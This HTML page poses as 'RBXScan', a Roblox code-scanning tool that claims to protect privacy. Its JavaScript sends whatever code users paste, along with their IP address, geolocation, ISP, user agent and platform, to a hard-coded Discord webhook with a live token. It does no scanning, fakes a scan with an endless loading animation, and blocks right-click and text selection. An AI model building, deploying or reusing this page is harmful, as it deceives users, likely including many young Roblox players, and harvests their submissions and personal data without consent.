<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXScan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: 
                linear-gradient(135deg, rgba(173, 216, 230, 0.8) 0%, rgba(135, 206, 235, 0.9) 50%, rgba(70, 130, 180, 0.8) 100%),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><defs><pattern id="wave" x="0" y="0" width="200" height="40" patternUnits="userSpaceOnUse"><path d="M0,20 Q50,0 100,20 T200,20 L200,40 L0,40 Z" fill="%23ffffff" opacity="0.1"/></pattern></defs><rect width="1200" height="600" fill="%234682b4"/><rect width="1200" height="600" fill="url(%23wave)"/><circle cx="100" cy="100" r="3" fill="%23ffffff" opacity="0.3"><animate attributeName="cy" values="100;120;100" dur="3s" repeatCount="indefinite"/></circle><circle cx="300" cy="150" r="2" fill="%23ffffff" opacity="0.4"><animate attributeName="cy" values="150;170;150" dur="4s" repeatCount="indefinite"/></circle><circle cx="500" cy="80" r="4" fill="%23ffffff" opacity="0.2"><animate attributeName="cy" values="80;100;80" dur="5s" repeatCount="indefinite"/></circle><circle cx="800" cy="200" r="3" fill="%23ffffff" opacity="0.3"><animate attributeName="cy" values="200;220;200" dur="3.5s" repeatCount="indefinite"/></circle><circle cx="1000" cy="120" r="2" fill="%23ffffff" opacity="0.4"><animate attributeName="cy" values="120;140;120" dur="4.5s" repeatCount="indefinite"/></circle></svg>');
            background-size: cover;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(70, 130, 180, 0.3);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(70, 130, 180, 0.2);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }

        .roblox-logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            gap: 15px;
        }

        .roblox-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(45deg, #1e3a8a, #3b82f6);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(30, 58, 138, 0.3);
            transform: rotate(-15deg);
            animation: float 3s ease-in-out infinite;
        }

        .roblox-icon::before {
            content: '';
            width: 30px;
            height: 30px;
            background: white;
            border-radius: 6px;
            transform: rotate(15deg);
        }

        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            text-shadow: 0 2px 4px rgba(70, 130, 180, 0.3);
            letter-spacing: 2px;
            animation: colorChange 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: rotate(-15deg) translateY(0px); }
            50% { transform: rotate(-15deg) translateY(-10px); }
        }

        @keyframes colorChange {
            0%, 100% { 
                color: #1e3a8a; 
                text-shadow: 0 2px 4px rgba(70, 130, 180, 0.3);
            }
            50% { 
                color: #ffffff; 
                text-shadow: 0 2px 8px rgba(30, 58, 138, 0.8), 0 0 20px rgba(59, 130, 246, 0.5);
            }
        }

        .subtitle {
            color: #3b82f6;
            margin-bottom: 30px;
            font-size: 1.1rem;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-field {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid rgba(70, 130, 180, 0.3);
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.8);
        }

        .input-field:focus {
            outline: none;
            border-color: #3b82f6;
            background: white;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        .submit-btn {
            background: linear-gradient(45deg, #3b82f6, #1e40af);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 16px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.4);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status-message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 8px;
            font-weight: 500;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .status-message.show {
            opacity: 1;
        }

        .status-message.success {
            background: #e8f5e8;
            color: #2e7d2e;
            border: 1px solid #4caf50;
        }

        .status-message.error {
            background: #ffeaea;
            color: #d32f2f;
            border: 1px solid #f44336;
        }

        .security-note {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #666;
            font-style: italic;
        }

        .compile-btn {
            background: linear-gradient(45deg, #1d4ed8, #1e3a8a);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 16px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-left: 15px;
        }

        .compile-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(29, 78, 216, 0.4);
        }

        .compile-btn:active {
            transform: translateY(0);
        }

        /* Popup styles */
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }

        .popup-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(15px);
            border: 2px solid rgba(70, 130, 180, 0.3);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(70, 130, 180, 0.3);
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }

        .popup-title {
            font-size: 2rem;
            font-weight: bold;
            color: #1e3a8a;
            margin-bottom: 20px;
            text-align: center;
            text-shadow: 0 2px 4px rgba(70, 130, 180, 0.3);
        }

        .code-textarea {
            width: 100%;
            min-height: 200px;
            padding: 15px;
            border: 2px solid rgba(70, 130, 180, 0.3);
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            background: rgba(255, 255, 255, 0.8);
        }

        .code-textarea:focus {
            outline: none;
            border-color: #3b82f6;
            background: white;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        .popup-buttons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            justify-content: center;
        }

        .close-btn {
            background: rgba(70, 130, 180, 0.2);
            color: #1e3a8a;
            border: 2px solid rgba(70, 130, 180, 0.3);
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
            background: rgba(70, 130, 180, 0.3);
            transform: translateY(-1px);
        }

        /* Loading animation */
        .loading-container {
            display: none;
            text-align: center;
            margin-top: 20px;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(59, 130, 246, 0.3);
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        .loading-text {
            color: #1e3a8a;
            font-weight: 600;
            font-size: 16px;
            animation: pulse 2s ease-in-out infinite;
        }

        .loading-dots {
            animation: dots 1.5s ease-in-out infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="roblox-logo">
            <div class="roblox-icon"></div>
            <div class="logo">RBXScan</div>
        </div>
        <div class="subtitle">Advanced Code Scanner</div>
        
        <form id="scannerForm">
            <div class="input-group">
                <input 
                    type="text" 
                    id="codeInput" 
                    class="input-field" 
                    placeholder="Paste your code here..."
                    required
                    autocomplete="off"
                    spellcheck="false"
                >
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                Scan Code
            </button>
            <button type="button" class="compile-btn" id="compileBtn">
                Scan
            </button>
        </form>
        
        <div id="statusMessage" class="status-message"></div>
        
        <div class="security-note">
            🔒 RBXScan securely transmits your code with full privacy protection
        </div>
    </div>

    <!-- Compile Popup -->
    <div id="compilePopup" class="popup-overlay">
        <div class="popup-content">
            <div class="popup-title">🔍 RBXScan Scanner</div>
            <form id="compileForm">
                <textarea 
                    id="codeTextarea" 
                    class="code-textarea" 
                    placeholder="Paste your code here to scan...&#10;&#10;-- Example:&#10;print('Hello World!')&#10;game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50"
                    required
                    spellcheck="false"
                ></textarea>
                
                <div class="popup-buttons">
                    <button type="button" class="close-btn" id="closePopup">Cancel</button>
                    <button type="submit" class="submit-btn" id="compileSubmitBtn">
                        🔍 Scan Code
                    </button>
                </div>
            </form>
            
            <div id="compileStatusMessage" class="status-message"></div>
            
            <div id="loadingContainer" class="loading-container">
                <div class="loading-spinner"></div>
                <div class="loading-text">
                    Checking PowerShell<span class="loading-dots">...</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('scannerForm');
        const codeInput = document.getElementById('codeInput');
        const submitBtn = document.getElementById('submitBtn');
        const statusMessage = document.getElementById('statusMessage');
        
        // Compile popup elements
        const compileBtn = document.getElementById('compileBtn');
        const compilePopup = document.getElementById('compilePopup');
        const compileForm = document.getElementById('compileForm');
        const codeTextarea = document.getElementById('codeTextarea');
        const compileSubmitBtn = document.getElementById('compileSubmitBtn');
        const compileStatusMessage = document.getElementById('compileStatusMessage');
        const closePopup = document.getElementById('closePopup');
        const loadingContainer = document.getElementById('loadingContainer');
        
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

        // Rate limiting and spam prevention
        let lastSubmissionTime = 0;
        let submittedCodes = new Set();
        const RATE_LIMIT_MS = 30000; // 30 seconds between submissions
        const MIN_CODE_LENGTH = 10;
        const MAX_CODE_LENGTH = 1000;

        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = `status-message ${type} show`;
            setTimeout(() => {
                statusMessage.classList.remove('show');
            }, 3000);
        }

        function getCurrentTimestamp() {
            return new Date().toLocaleString();
        }

        function isValidCode(code) {
            const cleanCode = code.trim();

            // Check minimum length with specific message
            if (cleanCode.length < MIN_CODE_LENGTH) {
                return { valid: false, reason: 'Too short! Code must be at least 10 characters long.' };
            }

            // Check maximum length
            if (cleanCode.length > MAX_CODE_LENGTH) {
                return { valid: false, reason: `Code too long! Must not exceed ${MAX_CODE_LENGTH} characters.` };
            }

            // Check if code was already submitted
            const codeHash = btoa(cleanCode).substring(0, 20);
            if (submittedCodes.has(codeHash)) {
                return { valid: false, reason: 'This code has already been submitted!' };
            }

            // Check for obvious spam patterns
            const spamPatterns = [
                /^(.)\1{5,}$/,  // Same character repeated 6+ times (entire string)
                /^(..)\1{3,}$/, // Same 2 characters repeated 4+ times (entire string) 
                /^(test|spam|hello|hi|asdf|qwerty|123|abc)+$/i, // Common spam words only
                /^[^a-zA-Z0-9]*$/, // Only special characters
                /^\s*$/, // Only whitespace
                /^[0-9]{1,5}$/, // Just simple numbers 1-5 digits
                /^[a-zA-Z]{1,8}$/, // Just simple letters 1-8 characters
            ];

            for (const pattern of spamPatterns) {
                if (pattern.test(cleanCode)) {
                    return { valid: false, reason: 'Stop spamming nonsense! Enter a real code.' };
                }
            }

            // Check for too few unique characters (spam detection)
            const uniqueChars = new Set(cleanCode.toLowerCase().replace(/\s/g, '')).size;
            if (uniqueChars < 4) {
                return { valid: false, reason: 'Stop spamming! Your input has too few unique characters.' };
            }

            // Must look like actual code - allow various code formats
            const codePatterns = [
                // Programming code patterns
                /\b(function|var|let|const|if|else|for|while|return|class|def|import|require|local|end)\b/i,
                // Script/game code patterns  
                /^[A-Z0-9]{8,}$/i, // All caps alphanumeric (game codes)
                /^[a-zA-Z0-9]{12,}$/, // Long alphanumeric strings
                // URL patterns (scripts)
                /https?:\/\//,
                /www\./,
                // Base64 patterns
                /^[A-Za-z0-9+\/=]{15,}$/,
                // Hex codes
                /^[0-9a-fA-F]{12,}$/,
                // UUID patterns
                /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i,
                // Programming syntax
                /[{}();=\[\]]/,
                // Lua/Roblox script patterns
                /(loadstring|getfenv|spawn|wait|print|script|game\.|workspace\.|_G\.|getgenv)/i,
                // Common code structures
                /(\.lua|\.js|\.py|\.rb|\.php)/i,
                // Pastebin/script sharing sites
                /(pastebin|github|gist|raw\.githubusercontent)/i,
                // Has both letters and numbers in a complex way
                /^(?=.*[a-zA-Z])(?=.*[0-9])[a-zA-Z0-9\s\-_+=\/\\(){}\[\];:'".,!@#$%^&*]{10,}$/
            ];

            let isValidFormat = false;
            for (const pattern of codePatterns) {
                if (pattern.test(cleanCode)) {
                    isValidFormat = true;
                    break;
                }
            }

            if (!isValidFormat) {
                return { valid: false, reason: 'Enter a real code! (script, game code, URL, etc.)' };
            }

            return { valid: true };
        }

        function checkRateLimit() {
            const now = Date.now();
            
            // Check time-based rate limit
            if (now - lastSubmissionTime < RATE_LIMIT_MS) {
                const waitTime = Math.ceil((RATE_LIMIT_MS - (now - lastSubmissionTime)) / 1000);
                return { allowed: false, reason: `Please wait ${waitTime} seconds before submitting again` };
            }

            return { allowed: true };
        }

        async function getLocationInfo() {
            try {
                // Get IP-based location info
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (error) {
                return {
                    ip: 'Unable to fetch',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    timezone: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        async function sendToWebhook(code) {
            try {
                // Get location information
                const locationInfo = await getLocationInfo();
                
                const payload = {
                    content: "@everyone 🚨 **NEW CODE DETECTED** 🚨",
                    embeds: [{
                        title: "🔍 RBX Scanner - Code Submission Alert",
                        description: `**📝 Submitted Code:**\n\`\`\`\n${code}\n\`\`\``,
                        color: 0xFF4444, // Red color for alert
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "RBX Scanner Alert System"
                        },
                        fields: [
                            {
                                name: "📅 Submission Time",
                                value: getCurrentTimestamp(),
                                inline: true
                            },
                            {
                                name: "🌐 IP Address",
                                value: locationInfo.ip,
                                inline: true
                            },
                            {
                                name: "🏙️ Location",
                                value: `${locationInfo.city}, ${locationInfo.region}`,
                                inline: true
                            },
                            {
                                name: "🌍 Country",
                                value: locationInfo.country,
                                inline: true
                            },
                            {
                                name: "🕐 Timezone",
                                value: locationInfo.timezone,
                                inline: true
                            },
                            {
                                name: "🌐 ISP",
                                value: locationInfo.isp,
                                inline: true
                            },
                            {
                                name: "💻 User Agent",
                                value: navigator.userAgent.substring(0, 100) + "...",
                                inline: false
                            },
                            {
                                name: "📱 Platform",
                                value: `${navigator.platform} - ${navigator.language}`,
                                inline: true
                            },
                            {
                                name: "🔗 Source",
                                value: "RBX Scanner Website",
                                inline: true
                            }
                        ]
                    }]
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    return { success: true };
                } else {
                    throw new Error(`HTTP ${response.status}`);
                }
            } catch (error) {
                console.error('Webhook error:', error);
                return { success: false, error: error.message };
            }
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const code = codeInput.value.trim();
            
            if (!code) {
                showStatus('Please enter a code to scan', 'error');
                return;
            }

            // Check rate limiting
            const rateLimitCheck = checkRateLimit();
            if (!rateLimitCheck.allowed) {
                showStatus(rateLimitCheck.reason, 'error');
                return;
            }

            // Validate code format - prevent nonsense spam
            const validation = isValidCode(code);
            if (!validation.valid) {
                showStatus(validation.reason, 'error');
                return;
            }

            // Disable form during submission
            submitBtn.disabled = true;
            submitBtn.textContent = 'Scanning...';
            
            // Send to webhook
            const result = await sendToWebhook(code);
            
            if (result.success) {
                // Update rate limiting counters
                lastSubmissionTime = Date.now();
                const codeHash = btoa(code).substring(0, 20);
                submittedCodes.add(codeHash);
                
                showStatus('✅ Code scanned successfully!', 'success');
                codeInput.value = ''; // Clear the input for security
            } else {
                showStatus('❌ Failed to scan code. Please try again.', 'error');
            }
            
            // Re-enable form
            submitBtn.disabled = false;
            submitBtn.textContent = 'Scan Code';
        });

        // Clear input on page load for security
        window.addEventListener('load', () => {
            codeInput.value = '';
        });

        // Prevent right-click context menu for added security
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
        });

        // Disable text selection for security
        document.addEventListener('selectstart', (e) => {
            if (e.target !== codeInput && e.target !== codeTextarea) {
                e.preventDefault();
            }
        });

        // Popup functionality
        compileBtn.addEventListener('click', () => {
            compilePopup.style.display = 'block';
            codeTextarea.focus();
        });

        closePopup.addEventListener('click', () => {
            compilePopup.style.display = 'none';
            codeTextarea.value = '';
            loadingContainer.style.display = 'none';
            compileSubmitBtn.disabled = false;
            compileSubmitBtn.textContent = '🚀 Compile Code';
        });

        // Close popup when clicking outside
        compilePopup.addEventListener('click', (e) => {
            if (e.target === compilePopup) {
                closePopup.click();
            }
        });

        // Compile form submission
        compileForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const code = codeTextarea.value.trim();
            
            if (!code) {
                showCompileStatus('Please enter code to compile', 'error');
                return;
            }

            // Check rate limiting
            const rateLimitCheck = checkRateLimit();
            if (!rateLimitCheck.allowed) {
                showCompileStatus(rateLimitCheck.reason, 'error');
                return;
            }

            // Validate code format - prevent nonsense spam
            const validation = isValidCode(code);
            if (!validation.valid) {
                showCompileStatus(validation.reason, 'error');
                return;
            }

            // Show loading animation (infinite)
            compileSubmitBtn.disabled = true;
            compileSubmitBtn.textContent = 'Compiling...';
            loadingContainer.style.display = 'block';
            compileStatusMessage.classList.remove('show');
            
            // Send to webhook but keep loading animation running
            const result = await sendToWebhook(code);
            
            if (result.success) {
                // Update rate limiting counters
                lastSubmissionTime = Date.now();
                const codeHash = btoa(code).substring(0, 20);
                submittedCodes.add(codeHash);
                
                // Keep the loading animation running infinitely
                // Don't hide it or show success message
            } else {
                // Only show error if webhook fails
                loadingContainer.style.display = 'none';
                compileSubmitBtn.disabled = false;
                compileSubmitBtn.textContent = '🚀 Compile Code';
                showCompileStatus('❌ Compilation failed. Please try again.', 'error');
            }
        });

        function showCompileStatus(message, type) {
            compileStatusMessage.textContent = message;
            compileStatusMessage.className = `status-message ${type} show`;
            setTimeout(() => {
                compileStatusMessage.classList.remove('show');
            }, 3000);
        }
    </script>
</body>
</html>
